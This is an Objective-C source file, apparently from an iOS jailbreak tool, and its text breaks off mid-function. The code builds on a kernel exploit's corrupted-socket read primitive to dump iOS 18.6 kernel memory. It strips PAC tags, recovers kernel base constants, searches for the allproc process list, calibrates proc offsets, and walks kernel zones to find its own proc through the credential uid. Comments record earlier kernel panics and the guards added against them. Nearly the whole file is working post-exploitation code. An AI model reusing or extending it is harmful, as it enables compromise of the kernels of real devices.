#import "KPDump.h"
#import "KPLog.h"

#import <errno.h>
#import <string.h>
#import <sys/utsname.h>
#import <unistd.h>
#import <UIKit/UIDevice.h>

#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/translation.h>

#import "exploit/kexploit_opa334.h" // darksword_*_socket_pcb() (corrupted inpcb VAs) for the zone route

static BOOL kpLooksLikeKernelPointer(uint64_t v)
{
    return (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
}

static void kpNote(NSMutableString *report, NSString *line)
{
    [[KPLog shared] append:line];
    if (report) [report appendFormat:@"%@\n", line];
}

// The EL2 domain (SPTM/TXM images at 0xfffffff01…/0xfffffff02…) faults in the
// physical aperture when read via the socket primitive — PANIC. Field data:
// everything else (kernel statics, zone map, shared pages) reads universally.
// So block exactly that domain, not "everything below kernel base" (the zone
// map lives below the base and must stay readable for the proc walk).
static BOOL kpVAIsEL2Domain(uint64_t addr)
{
    // The SPTM/TXM images load into the 01…/02… VA bands (panic headers), and
    // reading them faults from EL1. But the kernel image itself slides into
    // the same band on some boots — with slide 0x2712c000 the kernel landed at
    // 0xfffffff02e130000 and this guard skipped the whole dump. EL2 means:
    // in the band AND outside the kernel image's own span.
    BOOL inBand = addr >= 0xfffffff010000000ULL && addr < 0xfffffff030000000ULL;
    if (!inBand) return NO;
    uint64_t kb = kconstant(base);
    if (kb && addr >= kb && addr < kb + 0x5000000ULL) return NO;
    return YES;
}

// Read kernel memory. Universal per field data; the only forbidden range is
// the EL2 SPTM/TXM image domain (panic on read).
static BOOL kpRead(uint64_t addr, void *out, size_t size, const char *what, NSMutableString *report)
{
    if (!addr) {
        kpNote(report, [NSString stringWithFormat:@"  %-32s пропуск: ключ не найден в словаре оффсетов", what]);
        return NO;
    }
    if (kpVAIsEL2Domain(addr)) {
        kpNote(report, [NSString stringWithFormat:@"  %-32s VA 0x%llx в EL2-домене (SPTM/TXM) — чтение = паника, пропуск", what, addr]);
        return NO;
    }
    memset(out, 0, size);
    kreadbuf(addr, out, size);
    return YES;
}

static void kpAppendHexDump(NSMutableString *out, uint64_t baseAddr, const void *data, size_t size)
{
    const uint8_t *bytes = (const uint8_t *)data;
    for (size_t i = 0; i < size; i += 16) {
        NSMutableString *hex = [NSMutableString string];
        NSMutableString *asc = [NSMutableString string];
        for (size_t j = i; j < i + 16 && j < size; j++) {
            [hex appendFormat:@"%02x ", bytes[j]];
            [asc appendFormat:@"%c", (bytes[j] >= 0x20 && bytes[j] <= 0x7e) ? bytes[j] : '.'];
        }
        while (hex.length < 16 * 3) [hex appendString:@"   "];
        [out appendFormat:@"    0x%016llx: %@| %@\n", baseAddr + i, hex, asc];
    }
}

// Guarded hexdump of a region. Returns YES when the read happened.
static BOOL kpDumpRegion(NSMutableString *report, const char *what, uint64_t addr, size_t size)
{
    if (!addr) {
        kpNote(report, [NSString stringWithFormat:@"  %-32s пропуск: ключ не найден в словаре оффсетов", what]);
        return NO;
    }
    void *buf = malloc(size);
    if (!kpRead(addr, buf, size, what, report)) {
        free(buf);
        return NO;
    }
    NSMutableString *hex = [NSMutableString string];
    kpAppendHexDump(hex, addr, buf, size);
    [[KPLog shared] append:hex];
    if (report) [report appendString:hex];
    free(buf);
    return YES;
}

// Guarded u64 read; value goes to *out (untouched on failure).
static BOOL kpReadU64(const char *what, uint64_t addr, uint64_t *out, NSMutableString *report)
{
    uint64_t v = 0;
    if (!kpRead(addr, &v, sizeof(v), what, report)) return NO;
    kpNote(report, [NSString stringWithFormat:@"  %-32s = 0x%016llx", what, v]);
    *out = v;
    return YES;
}

// VA/PA forms of the tagged cpu_ttep value (set by initializeBootConstantsGuarded;
// the survey's translation self-check picks the mode that actually walks).
static uint64_t gCpuTtepVA = 0;
static uint64_t gCpuTtepPhys = 0;

@implementation KPDump

+ (void)initializeBootConstantsGuarded
{
    NSMutableString *scratch = [NSMutableString string];

    gSystemInfo.kernelConstant.base = kconstant(staticBase) + gSystemInfo.kernelConstant.slide;

    // 18.6: these globals hold PAC-tagged values. Strip with kp_untag_ptr and
    // store only when the stripped result is sane. cpu_ttep is special: it is
    // a TTBR value (ASID in bits 63:48, phys base in 47:0) — its phys part is
    // masked WITHOUT sign extension. The VA-form strip is kept separately for
    // the VA-mode translation self-check in the survey.
    uint64_t v = 0;
    if (kpRead(ksymbol(gVirtBase), &v, sizeof(v), "gVirtBase", scratch)) {
        uint64_t s = kp_untag_ptr(v);
        BOOL sane = kpLooksLikeKernelPointer(s);
        if (sane) gSystemInfo.kernelConstant.virtBase = s;
        [[KPLog shared] appendFormat:@"  gVirtBase: raw=0x%016llx strip=0x%016llx%s",
            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не похож — не сохраняю)"];
    }
    v = 0;
    if (kpRead(ksymbol(gPhysBase), &v, sizeof(v), "gPhysBase", scratch)) {
        uint64_t s = kp_untag_ptr(v);
        BOOL sane = kpLooksLikeKernelPointer(s);
        if (sane) gSystemInfo.kernelConstant.physBase = s;
        [[KPLog shared] appendFormat:@"  gPhysBase: raw=0x%016llx strip=0x%016llx%s",
            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не похож — не сохраняю)"];
    }
    v = 0;
    if (kpRead(ksymbol(gPhysSize), &v, sizeof(v), "gPhysSize", scratch)) {
        uint64_t s = kp_untag_ptr(v);
        BOOL sane = (s != 0 && s <= 0x400000000ULL); // ≤16 GiB
        if (sane) gSystemInfo.kernelConstant.physSize = s;
        [[KPLog shared] appendFormat:@"  gPhysSize: raw=0x%016llx strip=0x%016llx%s",
            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не размер — не сохраняю)"];
    }
    v = 0;
    if (kpRead(ksymbol(cpu_ttep), &v, sizeof(v), "cpu_ttep", scratch)) {
        // TTBR: ASID in bits 63:48, phys base in 47:0 (mask only, no sign ext).
        uint64_t ttbrPhys = v & 0x0000ffffffffffffULL;
        uint64_t vaForm = kp_untag_ptr(v);
        gCpuTtepVA = vaForm;
        gCpuTtepPhys = ttbrPhys;
        gSystemInfo.kernelConstant.cpuTTEP = ttbrPhys;
        [[KPLog shared] appendFormat:@"  cpu_ttep: raw=0x%016llx ttbr-phys=0x%016llx va-формой=0x%016llx",
            (unsigned long long)v, (unsigned long long)ttbrPhys, (unsigned long long)vaForm];
    }

    // EXP-02: SPTM/TXM runtime bases — DEBG fast path, then pointer-vote.
    [self harvestSptmTxmBasesWithLog:scratch];

    [[KPLog shared] appendFormat:@"  base=%#llx virtBase=%#llx physBase=%#llx physSize=%#llx cpuTTEP=%#llx sptmBase=%#llx sptmSlide=%#llx txmBase=%#llx txmSlide=%#llx",
        kconstant(base), kconstant(virtBase), kconstant(physBase), kconstant(physSize),
        kconstant(cpuTTEP), kconstant(sptmBase), kconstant(sptmSlide), kconstant(txmBase), kconstant(txmSlide)];
}

#pragma mark - EXP-01: fixed allproc (multi-route, verified per hop)

static uint64_t gAllprocHead = 0;
static uint32_t gCommOff = 0;
static uint32_t gPidOff = 0;
static uint64_t gSelfProcVA = 0;

// A node holds a comm string when its window contains it as a C-string.
static BOOL kpNodeHasComm(const uint8_t *window, size_t size, const char *comm, uint32_t *offOut)
{
    size_t clen = strlen(comm) + 1;
    for (size_t i = 0; i + clen <= size; i++) {
        if (memcmp(window + i, comm, clen) == 0) {
            *offOut = (uint32_t)i;
            return YES;
        }
    }
    return NO;
}

// Walk a candidate list head (p_list links at proc+0/+8, per the ladder).
// Returns the VA of the node whose window holds "kernel_task", or 0. Every
// hop is PAC-stripped and sanity-checked before following.
static uint64_t kpWalkCandidateHead(uint64_t head, NSMutableString *r, uint32_t *commOffOut)
{
    if (!kpLooksLikeKernelPointer(head)) return 0;
    uint64_t node = head, prev = 0;
    for (int n = 0; n < 64 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
        // 1.4.3: a garbage-but-in-range head fed the walk into unmapped memory
        // and panicked the kernel at candidate #68 (previous run). Prove the
        // node is backed by a physical page before any read; a dead link ends
        // the walk quietly instead of panicking.
        if ((gCpuTtepVA || gCpuTtepPhys) && kvtophys(node) == 0) return 0;
        uint8_t window[0x400];
        memset(window, 0, sizeof(window));
        // 1.5.4: the gate above proved only the FIRST page. The 0x400 window
        // crosses the 16K page end for nodes past page offset 0x3c00 —
        // candidate #65 (head 0xffffffe267fdbd60, page offset 0x3d60) read
        // 0x160 bytes into an unmapped physmap page and panicked the kernel
        // inside getsockopt. Prove the last byte too, else clamp the window
        // to the 16K page end.
        size_t winSize = sizeof(window);
        if ((gCpuTtepVA || gCpuTtepPhys) && kvtophys(node + winSize - 1) == 0) {
            uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
            winSize = (size_t)(pageEnd - node);
        }
        if (!kpRead(node, window, winSize, "list node", r)) return 0;
        // Back-link validation: node's le_prev must address prev's le_next —
        // for proc, le_next is at offset 0, so le_prev == prev exactly.
        if (n > 0) {
            uint64_t backRaw = 0;
            memcpy(&backRaw, window + koffsetof(proc, list_prev), sizeof(backRaw));
            if (kp_untag_ptr(backRaw) != prev) return 0;
        }
        uint32_t off = 0;
        if (kpNodeHasComm(window, sizeof(window), "kernel_task", &off)) {
            *commOffOut = off;
            return node;
        }
        uint64_t nextRaw = 0;
        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
        prev = node;
        node = kp_untag_ptr(nextRaw);
    }
    return 0;
}

// Calibrate p_pid using the three known pids: kernel_task=0, launchd=1,
// ourselves=getpid(). Finds the 4-aligned offset matching all three; prefers
// the ladder value (0x60 on 18.6). No offset is trusted a priori.
+ (void)calibratePidOffset:(NSMutableString *)r
{
    if (!gAllprocHead || !gCommOff) return;

    const char *myName = getprogname();
    uint64_t ktVA = 0, launchdVA = 0, selfVA = 0;
    uint64_t node = gAllprocHead, prev = 0;
    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev && (!ktVA || !launchdVA || !selfVA); n++) {
        uint8_t window[0x400];
        memset(window, 0, sizeof(window));
        // 1.5.4: same page-tail rule as the candidate walk — clamp the read
        // window when the 16K page behind the node is unmapped.
        size_t winSize = sizeof(window);
        if ((gCpuTtepVA || gCpuTtepPhys)) {
            if (kvtophys(node) == 0) break;
            if (kvtophys(node + winSize - 1) == 0) {
                uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
                winSize = (size_t)(pageEnd - node);
            }
        }
        if (!kpRead(node, window, winSize, "calib node", r)) break;
        uint32_t dummy = 0;
        if (!ktVA && kpNodeHasComm(window, sizeof(window), "kernel_task", &dummy)) ktVA = node;
        if (!launchdVA && gCommOff && gCommOff + 32 <= winSize &&
            memcmp(window + gCommOff, "launchd", 8) == 0) launchdVA = node;
        if (!selfVA && gCommOff && gCommOff + strlen(myName) + 1 <= winSize &&
            memcmp(window + gCommOff, myName, strlen(myName) + 1) == 0) selfVA = node;
        uint64_t nextRaw = 0;
        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
        prev = node;
        node = kp_untag_ptr(nextRaw);
        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  калибровка pid: обошли %d узлов…", n + 1]);
    }
    kpNote(r, [NSString stringWithFormat:@"  калибровка: kernel_task=%#llx launchd=%#llx self=%#llx",
              (unsigned long long)ktVA, (unsigned long long)launchdVA, (unsigned long long)selfVA]);
    if (!ktVA || !launchdVA) {
        kpNote(r, @"  калибровка pid: не нашли kernel_task/launchd — остаёмся на оффсете лестницы");
        gPidOff = koffsetof(proc, pid);
        return;
    }

    // Solve: kt[off]==0 && launchd[off]==1 (&& self[off]==getpid() when found)
    uint32_t ladder = koffsetof(proc, pid);
    NSMutableArray<NSNumber *> *matches = [NSMutableArray array];
    for (uint32_t off = 0; off + 4 <= 0x400; off += 4) {
        uint32_t v0 = 0, v1 = 0, vSelf = 0;
        uint8_t tmp[4];
        if (!kpRead(ktVA + off, tmp, 4, "calib read", r)) break;      v0 = *(uint32_t *)tmp;
        if (v0 != 0) continue;
        if (!kpRead(launchdVA + off, tmp, 4, "calib read", r)) break; v1 = *(uint32_t *)tmp;
        if (v1 != 1) continue;
        if (selfVA) {
            if (!kpRead(selfVA + off, tmp, 4, "calib read", r)) break; vSelf = *(uint32_t *)tmp;
            if (vSelf != (uint32_t)getpid()) continue;
        }
        [matches addObject:@(off)];
    }
    if (matches.count == 0) {
        kpNote(r, @"  калибровка pid: ни один оффсет не сошёлся — лестница (0x60) под вопросом");
        gPidOff = ladder;
        return;
    }
    BOOL ladderOK = [matches containsObject:@(ladder)];
    gPidOff = ladderOK ? ladder : matches.firstObject.unsignedIntValue;
    kpNote(r, [NSString stringWithFormat:@"  p_pid оффсеты-кандидаты: %@%s; выбран 0x%x",
              [matches componentsJoinedByString:@","], ladderOK ? " (лестница среди них)" : " (лестницы НЕТ среди них)", gPidOff]);
}

// Walk the fixed chain matching our own comm — independent of p_pid.
+ (uint64_t)findSelfProcByComm:(NSMutableString *)r
{
    if (gSelfProcVA) return gSelfProcVA;
    if (!gAllprocHead || !gCommOff) return 0;
    const char *myName = getprogname();
    size_t myLen = strlen(myName) + 1;
    uint64_t node = gAllprocHead, prev = 0;
    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
        uint8_t window[0x400];
        memset(window, 0, sizeof(window));
        // 1.5.4: page-tail clamp, same as the candidate walk.
        size_t winSize = sizeof(window);
        if ((gCpuTtepVA || gCpuTtepPhys)) {
            if (kvtophys(node) == 0) return 0;
            if (kvtophys(node + winSize - 1) == 0) {
                uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
                winSize = (size_t)(pageEnd - node);
            }
        }
        if (!kpRead(node, window, winSize, "self scan", r)) return 0;
        if (gCommOff + myLen <= winSize && memcmp(window + gCommOff, myName, myLen) == 0) {
            gSelfProcVA = node;
            kpNote(r, [NSString stringWithFormat:@"  наш proc по comm: %#llx (pid=%d)", node, getpid()]);
            return node;
        }
        uint64_t nextRaw = 0;
        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
        prev = node;
        node = kp_untag_ptr(nextRaw);
        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  …обошли %d узлов, ищем \"%s\"", n + 1, myName]);
    }
    kpNote(r, @"  наш proc по comm не найден");
    return 0;
}

+ (uint64_t)resolveAllprocHeadWithLog:(NSMutableString *)r
{
    if (gAllprocHead) return gAllprocHead;
    uint64_t sym = ksymbol(allproc);
    if (!sym) {
        kpNote(r, @"  allproc: ключ не найден в словаре оффсетов — пропуск");
        return 0;
    }

    // Candidate list heads (runtime VAs), most likely first:
    //  A/B: the XPF anchor pair. Field result on 18.6: both read 0. Static
    //       analysis shows that pair takes inserts of a proc+0x6a0-pointed
    //       object — i.e. it is the pgrp/session list, NOT allproc.
    //  C/D: an alternate adjacent LIST_HEAD pair from static analysis of this
    //       exact kernelcache (proc-code region, +0/+8 links).
    //  E:   ±0x200 neighbourhood of the XPF anchor (small anchor drift).
    // 1.5.2: ordered set — the sym and sym±0x200 ranges produce duplicate head
    // addresses, and re-walking the same head a second time is what panicked
    // the kernel at "candidate #68" (a dup of #2). Walk each head once, ever.
    NSMutableOrderedSet<NSNumber *> *cands = [NSMutableOrderedSet orderedSet];
    if (kconstant(slide)) {
        [cands addObject:@(kconstant(slide) + 0xfffffff00aaded50ULL)];
        [cands addObject:@(kconstant(slide) + 0xfffffff00aaded58ULL)];
    }
    [cands addObject:@(sym)];
    [cands addObject:@(sym + 8)];
    for (int off = -0x200; off <= 0x200; off += 8) {
        [cands addObject:@(sym + off)];
    }

    const char *names[] = { "C (static 0xaaded50)", "D (static 0xaaded58)" };
    int idx = 0;
    for (NSNumber *candAddr in cands) {
        uint64_t headAddr = candAddr.unsignedLongLongValue;
        uint64_t raw = 0;
        if (!kpRead(headAddr, &raw, sizeof(raw), "head candidate", r)) { idx++; continue; }
        if (!raw) { idx++; continue; }
        uint64_t head = kp_untag_ptr(raw);
        if (!kpLooksLikeKernelPointer(head)) { idx++; continue; }
        kpNote(r, [NSString stringWithFormat:@"  кандидат #%d @ %#llx: head=0x%016llx — идём по цепочке",
                  idx, (unsigned long long)headAddr, (unsigned long long)head]);
        uint32_t commOff = 0;
        uint64_t ktNode = kpWalkCandidateHead(head, r, &commOff);
        if (ktNode) {
            gAllprocHead = head;
            gCommOff = commOff;
            const char *tag = idx < 2 ? names[idx] : (idx == 2 ? "A (XPF 0xaaa2608)" : (idx == 3 ? "B (XPF 0xaaa2610)" : "E (drift)"));
            kpNote(r, [NSString stringWithFormat:@"  EXP-01: allproc = голова %s @ %#llx; kernel_task @ %#llx; p_comm=+0x%x",
                      tag, (unsigned long long)headAddr, (unsigned long long)ktNode, gCommOff]);
            [self calibratePidOffset:r];
            return gAllprocHead;
        }
        idx++;
    }
    kpNote(r, @"  EXP-01: кандидаты исчерпаны — перехожу к zone-маршруту");

    // Zone route gives us OUR proc. From it, walk BACKWARD via le_prev (+8):
    // each element's le_prev is the previous element's VA (le_next lives at
    // offset 0); the first element's le_prev points at the head global in
    // __DATA (kernel image region). That recovers the allproc head itself.
    uint64_t selfProc = [self zoneRouteSelfProcWithLog:r];
    if (!selfProc) {
        kpNote(r, @"  EXP-01: zone-маршрут не дал proc — allproc недоступен");
        return 0;
    }
    gSelfProcVA = selfProc;

    uint64_t node = selfProc, prev = 0;
    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
        uint64_t prevRaw = 0;
        if (!kpRead(node + koffsetof(proc, list_prev), &prevRaw, sizeof(prevRaw), "le_prev", r)) break;
        uint64_t prevp = kp_untag_ptr(prevRaw);
        if (prevp >= kconstant(base) && prevp < kconstant(base) + 0x30000000ULL) {
            // head-global candidate: its value is the first element
            uint64_t firstElRaw = 0;
            if (kpRead(prevp, &firstElRaw, sizeof(firstElRaw), "head.lh_first", r)) {
                uint64_t firstEl = kp_untag_ptr(firstElRaw);
                if (kpLooksLikeKernelPointer(firstEl)) {
                    uint32_t commOff = gCommOff;
                    uint64_t ktNode = kpWalkCandidateHead(firstEl, r, &commOff);
                    if (ktNode) {
                        gAllprocHead = firstEl;
                        gCommOff = commOff;
                        kpNote(r, [NSString stringWithFormat:@"  EXP-01: allproc head восстановлен @ %#llx (zone-маршрут), kernel_task @ %#llx",
                                  (unsigned long long)prevp, (unsigned long long)ktNode]);
                        [self calibratePidOffset:r];
                        return gAllprocHead;
                    }
                }
            }
        }
        prev = node;
        node = prevp;
        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  …назад по цепочке: %d узлов", n + 1]);
    }
    kpNote(r, @"  EXP-01: наш proc есть, но голова списка не восстановлена — дамп ограничен");
    return 0;
}

// Walk the fixed allproc chain to a pid. Small windows for speed; progress
// logged every 64 nodes. Returns the proc VA or 0.
+ (uint64_t)findProcByPid:(uint32_t)pid log:(NSMutableString *)r
{
    uint64_t head = [self resolveAllprocHeadWithLog:r];
    if (!head) return 0;
    uint32_t pidOff = gPidOff ? gPidOff : koffsetof(proc, pid);

    uint64_t node = head, prev = 0;
    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
        uint8_t window[0x100];
        memset(window, 0, sizeof(window));
        if (!kpRead(node, window, sizeof(window), "proc scan", r)) return 0;
        uint32_t nodePid = 0;
        memcpy(&nodePid, window + pidOff, sizeof(nodePid));
        if (nodePid == pid) {
            char comm[33] = {0};
            if (gCommOff) {
                uint8_t full[0x400];
                memset(full, 0, sizeof(full));
                if (kpRead(node, full, sizeof(full), "proc full", r)) {
                    memcpy(comm, full + gCommOff, 32);
                }
            }
            kpNote(r, [NSString stringWithFormat:@"  найден proc pid=%u @ %#llx comm=\"%s\"", pid, node, comm]);
            return node;
        }
        if ((n & 0x3F) == 0x3F) {
            kpNote(r, [NSString stringWithFormat:@"  …обошли %d процессов, ищем pid %u", n + 1, pid]);
        }
        uint64_t nextRaw = 0;
        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
        prev = node;
        node = kp_untag_ptr(nextRaw);
    }
    kpNote(r, [NSString stringWithFormat:@"  pid %u не найден в allproc", pid]);
    return 0;
}

#pragma mark - EXP-01 fallback: zone-name route to our proc

// Verify an inpcb VA belongs to us: our process name sits in inp_last_comm
// (the exploit used the same oracle to corrupt this socket).
static BOOL kpInpcbLooksOurs(uint64_t inpcbVA, NSMutableString *r)
{
    uint8_t win[0x400];
    memset(win, 0, sizeof(win));
    if (!kpRead(inpcbVA, win, sizeof(win), "inpcb window", r)) return NO;
    const char *me = getprogname();
    BOOL found = NO;
    size_t myLen = strlen(me) + 1;
    for (size_t i = 0; i + myLen <= sizeof(win); i++) {
        if (memcmp(win + i, me, myLen) == 0) { found = YES; break; }
    }
    kpNote(r, [NSString stringWithFormat:@"  inpcb %#llx содержит наш comm: %s",
              (unsigned long long)inpcbVA, found ? "да" : "НЕТ"]);
    return found;
}

// Zone route: inpcb → pcbinfo → zone("inpcb") → calibrate z_name → scan for
// zone "proc" → walk its page queue → find our proc by comm → validate via
// the proc_ro→ucred→cr_uid == getuid() hop. Fully content-calibrated; no
// zone/proc offsets are trusted a priori.
+ (uint64_t)zoneRouteSelfProcWithLog:(NSMutableString *)r
{
    kpNote(r, @"  EXP-01 fallback: zone-маршрут (inpcb → зона «inpcb» → зона «proc» → наш proc)");
    uint64_t inpcbVA = darksword_control_socket_pcb() ? darksword_control_socket_pcb() : darksword_rw_socket_pcb();
    if (!inpcbVA) {
        kpNote(r, @"  нет pcb адреса в контексте эксплойта — выход");
        return 0;
    }
    if (!kpInpcbLooksOurs(inpcbVA, r)) {
        kpNote(r, @"  inpcb без нашего comm — маршрут не доверен, выход");
        return 0;
    }

    uint64_t raw = 0;
    if (!kpRead(inpcbVA + koffsetof(inpcb, pcbinfo), &raw, sizeof(raw), "inpcb.pcbinfo", r)) return 0;
    uint64_t pcbinfo = kp_untag_ptr(raw);
    kpNote(r, [NSString stringWithFormat:@"  pcbinfo: raw=0x%016llx → 0x%016llx", (unsigned long long)raw, (unsigned long long)pcbinfo]);
    if (!kpLooksLikeKernelPointer(pcbinfo)) return 0;

    raw = 0;
    if (!kpRead(pcbinfo + koffsetof(inpcbinfo, ipi_zone), &raw, sizeof(raw), "inpcbinfo.ipi_zone", r)) return 0;
    uint64_t zoneInpcb = kp_untag_ptr(raw);
    kpNote(r, [NSString stringWithFormat:@"  zone(inpcb): raw=0x%016llx → 0x%016llx", (unsigned long long)raw, (unsigned long long)zoneInpcb]);
    if (!kpLooksLikeKernelPointer(zoneInpcb)) return 0;

    // Calibrate z_name offset in struct zone: find the qword whose pointee
    // reads "inpcb".
    uint32_t zNameOff = 0;
    BOOL calibrated = NO;
    {
        uint8_t zw[0x400];
        memset(zw, 0, sizeof(zw));
        if (!kpRead(zoneInpcb, zw, sizeof(zw), "zone struct", r)) return 0;
        for (uint32_t off = 0; off + 8 <= sizeof(zw); off += 8) {
            uint64_t q = 0;
            memcpy(&q, zw + off, 8);
            uint64_t cand = kp_untag_ptr(q);
            if (!kpLooksLikeKernelPointer(cand)) continue;
            uint8_t strBuf[32];
            memset(strBuf, 0, sizeof(strBuf));
            if (!kpRead(cand, strBuf, sizeof(strBuf), "z_name candidate", r)) continue;
            if (memcmp(strBuf, "inpcb", 6) == 0) {
                zNameOff = off;
                calibrated = YES;
                kpNote(r, [NSString stringWithFormat:@"  z_name offset в struct zone: +0x%x (строка @ %#llx)", off, (unsigned long long)cand]);
                break;
            }
        }
    }
    if (!calibrated) {
        kpNote(r, @"  z_name offset не откалиброван — выход");
        return 0;
    }

    // Scan ±64 pages around the inpcb zone struct for a zone named "proc".
    uint64_t procZone = 0;
    uint64_t scanBase = zoneInpcb & ~0x3FFFULL;
    NSMutableString *zoneNames = [NSMutableString string];
    for (int64_t pg = -64; pg <= 64 && !procZone; pg++) {
        uint64_t pageVA = scanBase + pg * 0x4000;
        for (uint64_t off = 0; off < 0x4000 && !procZone; off += 0x400) {
            uint8_t win[0x400];
            memset(win, 0, sizeof(win));
            if (!kpRead(pageVA + off, win, sizeof(win), "zone page", r)) break;
            for (uint32_t q = 0; q + 8 <= sizeof(win); q += 8) {
                uint64_t qv = 0;
                memcpy(&qv, win + q, 8);
                uint64_t cand = kp_untag_ptr(qv);
                if (!kpLooksLikeKernelPointer(cand)) continue;
                // zone names live in the kernel __TEXT cstring region
                if (cand < kconstant(base) || cand >= kconstant(base) + 0x1000000) continue;
                uint8_t strBuf[32];
                memset(strBuf, 0, sizeof(strBuf));
                if (!kpRead(cand, strBuf, sizeof(strBuf), "zone name", r)) continue;
                if (strBuf[0] < 0x20 || strBuf[0] > 0x7e) continue;
                BOOL printable = YES;
                int len = 0;
                for (int c = 0; c < 31; c++) {
                    if (strBuf[c] == 0) { len = c; break; }
                    if (strBuf[c] < 0x20 || strBuf[c] > 0x7e) { printable = NO; break; }
                }
                if (!printable || len < 3) continue;
                [zoneNames appendFormat:@"%s@q%#llx ", (char *)strBuf, (unsigned long long)(pageVA + off + q)];
                if (memcmp(strBuf, "proc", 5) == 0) {
                    procZone = pageVA + off + q - zNameOff;
                    break;
                }
            }
        }
    }
    if (zoneNames.length) kpNote(r, [NSString stringWithFormat:@"  зоны рядом: %@", zoneNames]);
    if (!procZone) {
        kpNote(r, @"  зона «proc» не найдена в ±64 страницах — выход");
        return 0;
    }
    kpNote(r, [NSString stringWithFormat:@"  зона «proc» @ %#llx", (unsigned long long)procZone]);

    // Find the page-queue head field by content: a queue head {next,prev}
    // where next strips to a kernel VA and *(next+8) strips back to &field.
    uint32_t pageqOff = 0;
    {
        uint8_t zw[0x400];
        memset(zw, 0, sizeof(zw));
        if (!kpRead(procZone, zw, sizeof(zw), "proc zone struct", r)) return 0;
        for (uint32_t off = 0; off + 8 <= sizeof(zw); off += 8) {
            uint64_t q = 0;
            memcpy(&q, zw + off, 8);
            uint64_t next = kp_untag_ptr(q);
            if (!kpLooksLikeKernelPointer(next)) continue;
            uint64_t backRaw = 0;
            if (!kpRead(next + 8, &backRaw, sizeof(backRaw), "queue back-ptr", r)) continue;
            if (kp_untag_ptr(backRaw) == procZone + off) {
                pageqOff = off;
                kpNote(r, [NSString stringWithFormat:@"  z_pageq offset в proc-зоне: +0x%x (next=%#llx)", off, (unsigned long long)next]);
                break;
            }
        }
    }
    if (!pageqOff) {
        kpNote(r, @"  page-queue голова не найдена — выход");
        return 0;
    }

    // Walk zone pages; scan each for our comm; validate via ucred hop.
    const char *myName = getprogname();
    size_t myLen = strlen(myName) + 1;
    uint64_t zpage = 0;
    {
        uint64_t q = 0;
        if (!kpRead(procZone + pageqOff, &q, sizeof(q), "z_pageq first", r)) return 0;
        zpage = kp_untag_ptr(q);
    }
    uint64_t procVA = 0;
    for (int zp = 0; zp < 512 && kpLooksLikeKernelPointer(zpage) && !procVA; zp++) {
        uint64_t pageBase = zpage & ~0x3FFFULL;
        for (uint64_t off = 0; off < 0x4000 && !procVA; off += 0x400) {
            uint8_t win[0x400];
            memset(win, 0, sizeof(win));
            if (!kpRead(pageBase + off, win, sizeof(win), "proc page", r)) break;
            for (uint32_t q = 0; q + myLen <= sizeof(win); q++) {
                if (memcmp(win + q, myName, myLen) != 0) continue;
                // hit: find the containing element (stride 0x740 from pageBase)
                uint64_t hitVA = pageBase + off + q;
                for (uint64_t elem = pageBase; elem + 0x740 <= pageBase + 0x4000; elem += 0x740) {
                    if (hitVA < elem || hitVA >= elem + 0x740) continue;
                    // validate candidate: proc → proc_ro(+0x18) → ucred(+0x28) → uid(+0x18) == getuid()
                    uint64_t roRaw = 0, credRaw = 0;
                    if (!kpRead(elem + koffsetof(proc, proc_ro), &roRaw, sizeof(roRaw), "cand proc_ro", r)) break;
                    uint64_t ro = kp_untag_ptr(roRaw);
                    if (!kpLooksLikeKernelPointer(ro)) break;
                    if (!kpRead(ro + koffsetof(proc_ro, ucred), &credRaw, sizeof(credRaw), "cand ucred", r)) break;
                    uint64_t cred = kp_untag_ptr(credRaw);
                    if (!kpLooksLikeKernelPointer(cred)) break;
                    uint32_t uid = 0;
                    if (!kpRead(cred + 0x18, &uid, sizeof(uid), "cand cr_uid", r)) break;
                    kpNote(r, [NSString stringWithFormat:@"  кандидат proc %#llx (hit @ %#llx): uid=%u (ждём uid=%d)",
                              (unsigned long long)elem, (unsigned long long)hitVA, uid, getuid()]);
                    if (uid == (uint32_t)getuid()) {
                        procVA = elem;
                        gCommOff = (uint32_t)(hitVA - elem);
                        kpNote(r, [NSString stringWithFormat:@"  НАШ proc @ %#llx (ucred-hop подтверждён; p_comm=+0x%x)",
                                  (unsigned long long)procVA, gCommOff]);
                        break;
                    }
                }
                if (procVA) break;
            }
        }
        // next zpage
        uint64_t q = 0;
        if (!kpRead(zpage, &q, sizeof(q), "zpage next", r)) break;
        uint64_t next = kp_untag_ptr(q);
        if (next == kp_untag_ptr(zpage) || !next) break;
        zpage = next;
        if ((zp & 0x1F) == 0x1F) kpNote(r, [NSString stringWithFormat:@"  …обошли %d страниц proc-зоны", zp + 1]);
    }
    if (!procVA) {
        kpNote(r, @"  наш proc не найден в proc-зоне — выход");
    }
    return procVA;
}

static void kpDumpProc(NSMutableString *report, const char *label, uint64_t proc, uint32_t commOff)
{
    if (!kpLooksLikeKernelPointer(proc)) {
        kpNote(report, [NSString stringWithFormat:@"  %s: некорректный указатель proc %#llx — пропуск", label, proc]);
        return;
    }

    uint8_t window[0x400];
    if (!kpRead(proc, window, sizeof(window), label, report)) return;

    uint32_t pidOff = gPidOff ? gPidOff : koffsetof(proc, pid);
    uint32_t pid = 0;
    memcpy(&pid, window + pidOff, sizeof(pid));

    char comm[33] = {0};
    if (commOff && commOff + 32 <= sizeof(window)) {
